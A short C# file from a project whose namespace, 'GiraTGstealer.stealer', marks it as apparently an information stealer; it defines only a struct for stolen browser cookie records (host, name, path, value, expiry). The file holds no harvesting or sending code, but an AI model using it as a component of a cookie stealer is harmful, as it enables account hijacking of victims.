using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;

namespace GiraTGstealer.stealer
{
    internal class Format
    {
    }
    internal struct CookieFormat
    {
        internal string Host;

        internal string Name;

        internal string Path;

        internal string Cookies;

        internal ulong Expiry;

        internal CookieFormat(string host, string name, string path, string cookies, ulong expiry)
        {
            Host = host;
            Name = name;
            Path = path;
            Cookies = cookies;
            Expiry = expiry;
        }
    }
}
